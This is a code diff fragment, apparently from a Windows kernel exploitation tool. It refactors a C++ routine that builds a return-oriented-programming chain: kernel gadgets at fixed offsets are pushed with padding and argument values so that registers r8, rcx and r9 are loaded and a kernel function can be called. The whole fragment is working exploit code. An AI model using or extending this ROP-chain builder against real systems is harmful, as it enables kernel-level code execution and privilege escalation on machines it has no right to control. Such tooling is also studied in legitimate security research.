@@ -49,9 +49,9 @@ public:
             // all other args.
             if (ArgCount >= 4)
             {
-                KernelStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
+                this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
                 this->AddValue(0, "set r8 to 0");
-                KernelStackManager.AddPadding(0x28);
+                this->AddPadding(0x28);
                 this->AddGadget(0x24cd7b, "pop rcx; ret;");
                 this->AddValue(ConvertedArgs[3], "FourthArg");
                 this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
@@ -73,9 +73,9 @@ public:
 
             if (ArgCount >= 3)
             {
-                KernelStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
+                this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
                 this->AddValue(ConvertedArgs[2], "ThirdArg");
-                KernelStackManager.AddPadding(0x28);
+                this->AddPadding(0x28);
             }
         }
 
